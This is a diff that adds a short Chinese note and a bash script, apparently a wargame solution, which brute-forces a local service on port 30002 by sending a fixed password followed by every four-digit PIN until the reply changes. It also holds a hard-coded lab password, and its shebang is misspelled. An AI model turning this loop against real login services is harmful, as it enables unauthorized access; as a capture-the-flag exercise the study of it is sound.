@@ -1,0 +1,44 @@
+
+
+向某个服务器的端口连续发送数据, 直到正确返回
+
+```sh
+#!/bain/bash
+
+#nc 127.0.0.1 30002;
+
+server="127.0.0.1"
+port="30002"
+exec 3<>/dev/tcp/$server/$port	#建立持久 TCP 连接（绑定到文件描述符 3）
+
+# 读取服务器的初始欢迎信息（如果有）
+read -t 2 welcome_msg <&3
+echo "server says:$welcome_msg"
+
+pass24="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 "
+for i in {0..9999};do
+	num=$(printf "%04d" $i)		#不足4位补0
+	line="${pass24}${num}"
+	#send data
+	echo "$line" >&3
+	
+	#-t 1 设置 10 秒超时，防止服务器不说话导致卡死
+	if read -t 10 response <&3;then
+		# 判断返回结果是否包含成功关键字（如 "Correct" 或密码）
+        if [[ "$response" == *"Correct"* ]] || [[ "$response" != *"Wrong"* ]]; then
+        	echo "--------------------------------"
+        	echo "当前输入:$line"
+            echo "服务器返回: $response"
+            echo "--------------------------------"
+            break
+        fi
+    else
+    	echo "time out."
+    	break
+    fi
+
+done
+#关闭连接
+exec 3>&-
+```
+
